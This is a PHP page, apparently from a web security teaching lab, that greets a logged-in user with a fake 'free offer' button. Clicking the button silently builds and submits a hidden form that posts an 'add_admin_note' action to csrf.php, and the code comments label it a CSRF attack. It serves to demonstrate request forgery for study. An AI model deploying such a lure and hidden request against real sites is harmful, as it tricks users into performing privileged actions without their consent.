<?php
require_once __DIR__ . '/../shared/header.php';

if (!isset($_SESSION['username'])) {
    header("Location: ../auth/login.php");
    exit;
}
?>

<div class="box">
  <h2>Welcome, <?= htmlspecialchars($_SESSION['username']); ?>!</h2>

  <p>You have been selected to receive a <strong>FREE Special Offer!</strong></p>
  <p>Click the button below to claim it.</p>

  <!-- Button that triggers the CSRF attack -->
  <button class="btn" onclick="startAttack()">Get Free Offer 🎁</button>

  <script>
      function startAttack() {
          alert("🎁 Processing your free offer...");

          // hidden malicious POST
          const form = document.createElement("form");
          form.method = "POST";
          form.action = "csrf.php";

          const hidden = document.createElement("input");
          hidden.type = "hidden";
          hidden.name = "action";
          hidden.value = "add_admin_note";

          form.appendChild(hidden);
          document.body.appendChild(form);

          form.submit();
      }
  </script>


</div>

<?php require_once __DIR__ . '/../shared/footer.php'; ?>
